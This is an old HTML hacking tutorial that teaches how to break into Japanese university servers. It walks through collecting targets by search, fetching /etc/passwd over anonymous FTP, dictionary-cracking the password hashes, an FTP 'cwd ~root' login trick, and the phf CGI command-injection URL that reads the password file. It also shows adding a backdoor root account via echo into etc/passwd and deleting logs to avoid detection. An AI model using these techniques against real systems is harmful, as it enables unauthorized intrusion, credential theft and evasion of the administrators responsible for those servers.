<P>This guide was written in dedication of Samantha who showed me the right
<BR>path in life, the path to Satanism and Paganism, and she
<BR>And to the guy BliNdfire who absolutely had to know how to browser
hack,
<BR>so here it is…

<P>First of all you will need an ftp program such as ws_ftp.&nbsp; I use
Voyager FTP
<BR>downloadable at http://www.windows95.com it's real simple and easy
to use,
<BR>so try it if you haven't dealt with ftp before.&nbsp; Now once you
have the
<BR>program find an address like http://www.shiga-pc.ac.jp you can find
<BR>addresses like this by going to a search engine such as AltaVista and
<BR>running a search for url:ac.jp this tells the search engine to give
you
<BR>all the academic addresses in Japan&nbsp; ex.&nbsp; ac=academic jp=Japan
, you can
<BR>try this with any country ex.&nbsp; url:dk .&nbsp; But for now let's
just focus on
<BR>the Japanese servers. When u have an address (I would recommend making
a
<BR>list of about 100 and trying them all) go to your ftp program and type
in
<BR>the address ex.&nbsp; http://www.shiga-pc.ac.jp&nbsp; note..&nbsp;
You will have to log in
<BR>anonymously.&nbsp;&nbsp; You should then get a list of folders on the
remote system
<BR>usr, pub,etc, dev, bin.&nbsp; See the etc folder? open it, once opened
you should
<BR>see some files passwd and group, open or view the file passwd (this
is where
<BR>the passwords for the system are stored), you should hopefully get
something
<BR>that looks like this.

<P>root:RqX6dqOZsf4BI:0:1:System PRIVILEGED Account,,,:/:/bin/csh

<BR>dbrown:fmTUonryY2mCE:295:15:Doris Brown:/usr/email/users/dbrown:/bin/csh

<P>This means you've hit the jackpot, in this case you should get a password
<BR>cracker download one at (http://www.hackersweb.com&nbsp; go to the
hacking toolz
<BR>section), I would recommend for the beginning hacker to get a password
<BR>cracker such as killer cracker because it's extremely easy to use.&nbsp;
Once you
<BR>have downloaded killer cracker you will need a dictionary file
<BR>(get one at http://www.hackersweb.com&nbsp; look in the extra toolz
section),
<BR>dictionary filez are better the bigger they are so I would recommend
<BR>getting one at around 10 MB or more.&nbsp; Now the passwords from the
passwd
<BR>file off the server you are hacking, you will need to save them to
a file
<BR>and place them in the same directory as Killer Cracker, you will also
need
<BR>to have your dictionary file in the same directory.&nbsp; Now you are
ready to
<BR>go, just run killer cracker and tell it the name of the Pwfile=the
password
<BR>file and the name of the word file=your dictionary file, the valid
file will
<BR>be the file where the output of the password cracker will be put just
give
<BR>it a name such as crack.txt.&nbsp; Once the cracker is done cracking
the password
<BR>files for you goto the valid file and take a look the file should look
<BR>something like this root:root:0:1:System PRIVILEGED Account,,,:/:/bin/csh
<BR>(remember this is an example). This file says that the username is
root
<BR>and the password is rootif the file had been like this.
<BR>root:dumbass:0:1:System PRIVILEGED Account,,,:/:/bin/csh
<BR>(remember again just an example) the login or username would be root
and
<BR>the password would be dumbass, well that's it just ftp to the site
using
<BR>the login and password.&nbsp; Note if you get root type in the following
once
<BR>you have logged in:-&nbsp;&nbsp; echo "myserver::0:0:Test User:/:/bin/csh">>etc\passwd
<BR>this will allow you to login to the server with 1:myserver so you
<BR>get the admin suspicious when they see people login as root.&nbsp;
Hide yourself
<BR>as much as possible, if you already have a shell then go through that
first
<BR>when loggin on, or telnet to the hacked site shell and then re-telnet
to the
<BR>hacked shell using the hacked shell, if you see what I mean, so your
who
<BR>appears as local host.&nbsp; Also get some c scripts which delete your
presence,
<BR>erases you off logs etc…

<P>Now if you were not as lucky to get exactly the same password file as
shown
<BR>in the example above then maybe you got something like this.

<P>root:*:0:1:Operator:/:
<BR>ftp:*:53:53:anonymous ftp:/pub:
<BR>t2:*:201:201:Takaoka Tadashi:/pub:

<P>This means that the passwd file is shadowed, if this is the case then
<BR>welcome to the administrators world of trying to stop hackers, this
is
<BR>where you cant really do anything.&nbsp; However there is one thing
to do
<BR>sometimes in very rare cases there may be a folder on the remote system
<BR>that can be accessed by an anonymous login called shadowed, shadow,
or
<BR>secret if this is the case the password files should be in there,
<BR>congratulations.&nbsp;&nbsp; If there isn't a folder like this, and
the passwd file
<BR>is shadowed then bad luck, go to the next address on your list.

<P>Now that you have tried the first thing as shown above there are a couple
<BR>of other methods you may also want to try one is FTP hacking shown
below…

<P>Go to a dos prompt after you are connected to the internet .

<P>Type.

<P>ftp www.victim=the site address
<BR>server will ask for a username press enter
<BR>server will ask for a password press enter
<BR>at the prompt type quote&nbsp; user ftp
<BR>then type
<BR>quote cwd ~root
<BR>then type
<BR>quote pass ftp

<P>If you get in make sure you delete the log file they might look at it
and
<BR>see that you were on.&nbsp; Once you get on the passwd file is in etc/passwd
so
<BR>type cd etc then type get passwd.&nbsp; If you have done the above
right and the
<BR>server is old you will have root access.&nbsp; By the way root is the
highest
<BR>security status you can have.
<BR>&nbsp;

<P>Another good way of getting root or a shell at least is through browser
<BR>hacking.&nbsp; Again well use Japanese educational servers as our target.
To do
<BR>this you will need a browser such as Netscape or Internet Explorer,
you
<BR>will also need a telnet program, you can either download a telnet program
<BR>at http://www.windows95.com or use the one that already comes with
dos.
<BR>To access the telnet program that comes with dos go to your dos windows
and
<BR>type in telnet www.site.com&nbsp; the site.com stand for the site you
want to
<BR>telnet to, it could be anything like www.geidai.ac.jp or
<BR>www.tulips.tsukuba.ac.jp .&nbsp; You will also need a cracker program
I would
<BR>recommend using Killer Cracker and applying as above.

<P>Next thing you do is open your browser and run a search for url:ac.jp
,
<BR>like explained above.&nbsp; Again I would recommend making a big list
of your
<BR>targets.&nbsp; Now when you have your targets we address type it in
your browser
<BR>and add this to it…

<P>http://www.tagetgoeshere.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

<P>or

<P>http://www.tagetgoeshere.com/cgi/phf?Qalias=x%0a/bin/cat%20/etc/passwd

<P>To all you out there who are slightly advanced, I know this is the phf
<BR>technique and it is virtually dead, but you'll be surprised where you
can
<BR>use this.

<P>This technique of finding the password file was first used in November
1996
<BR>on the fbi.gov webpage by a few hackers. It has been patched up by
a lot of
<BR>servers, so this won't work on something like www.nasa.gov or most
of the
<BR>www.*.com sites.&nbsp; But still works on many university servers outside
Europe
<BR>and the U.S.

<P>O.K.&nbsp; Once the url is entered you will see a number of things:-

<P>Error 404

<P>Cgi-bin/phf is not found on this server (the most common one)

<P>Or

<P>Warning

<P>You do not have permission to view cgi-bin/phf?/ on this server

<P>There are a number of other things the server might say, but the thing
you
<BR>want it to say is this:-

<P>Query Results

<P>/usr/local/bin/ph -m alias=x /bin/cat /etc/passwd

<P>root:2hjh34b4hj:0:1:0000-Admin(0000):/:/bin/sh
<BR>daemon:fghfhijyjk:1:1:0000-Admin(0000):/:

<BR>listen:eoend:37:4:Network Admin:/usr/net/nls:
<BR>nobody:ccvjcvj:60001:60001:uid no b

<P>etc…

<P>This means you have hit the jackpot!!!

<P>If you get something similar to this but all lines have something in
common
<BR>like the following:-

<P>Query Results

<P>/usr/local/bin/ph -m alias=x /bin/cat /etc/passwd

<P>root:x:0:1:0000-Admin(0000):/:/bin/sh
<BR>daemon:x:1:1:0000-Admin(0000):/:
<BR>bin:x:2:2:0000-Admin(0000):/usr/bin:/bin/csh
<BR>sys:x:3:3:0000-Admin(0000):/:
<BR>adm:x:4:4:0000-Admin(0000):/var/adm:
<BR>wnn:x:5:5:0000-Admin(0000):/var/adm:
<BR>news:x:6:6:0000-Admin(0000):/usr/lib/news:
<BR>lp:x:71:8:0000-lp(0000):/usr/spool/lp:
<BR>smtp:x:0:0:mail daemon user:/:
<BR>uucp:x:5:5:0000-uucp(0000):/usr/lib/uucp:
<BR>nuucp:x:9:9:0000-uucp(0000):/var/spool/uucppublic:/usr/lib/uucp/uucico
<BR>listen:x:37:4:Network Admin:/usr/net/nls:
<BR>nobody:x:60001:60001:uid no b

<P>(notice the c) if you don't know what this means it means the password
<BR>file is shadowed and you cannot work out ht epasswords for a shadowed
<BR>password file then you're in bad luck, I would recommend trying the
ftp
<BR>hack prior to this for the best results.

<P>If some but not all logins have a * in them then it's ok, it's worth
while
<BR>getting the ones which aren't shadowed, hey a shell is a shell!!!

<P>If you want to use your newly acquired shells then telnet to the site
and
<BR>put in the login and the password (remember you have to crack the password
<BR>file first explained at the top).

<P>Anyway that's it for now hope at least some people benefited from this
guide.
